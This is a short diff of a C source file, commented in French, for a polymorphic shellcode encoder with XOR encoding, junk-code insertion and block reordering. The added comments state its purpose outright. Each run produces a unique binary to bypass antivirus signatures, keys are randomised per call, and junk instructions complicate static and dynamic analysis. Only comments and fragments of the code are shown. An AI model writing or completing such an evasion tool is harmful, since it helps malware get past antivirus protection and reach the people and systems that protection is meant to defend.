@@ -9,6 +9,8 @@
  * - Substitution d'instructions équivalentes
  * - Insertion de junk code
  * - Réordonnancement des blocs
+ *
+ * Chaque exécution produit un binaire unique -> bypass signatures AV
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -70,6 +72,7 @@ static void RandomBytes(BYTE* buffer, DWORD size) {
 /*
  * Encode un shellcode avec XOR et génère un décodeur
  * Le résultat est: [décodeur][shellcode_encodé]
+ * Clé générée aléatoirement à chaque appel
  */
 BOOL Poly_XOREncode(BYTE* shellcode, DWORD shellcodeSize, 
                     BYTE** outEncoded, DWORD* outSize) {
@@ -269,6 +272,7 @@ BOOL Poly_MultiXOREncode(BYTE* shellcode, DWORD shellcodeSize,
 
 /*
  * Instructions junk valides qui ne font rien d'utile
+ * Complique l'analyse statique et dynamique
  */
 static const BYTE JUNK_INSTRUCTIONS[][4] = {
     {0x90, 0x00, 0x00, 0x00},             /* nop (1 byte) */
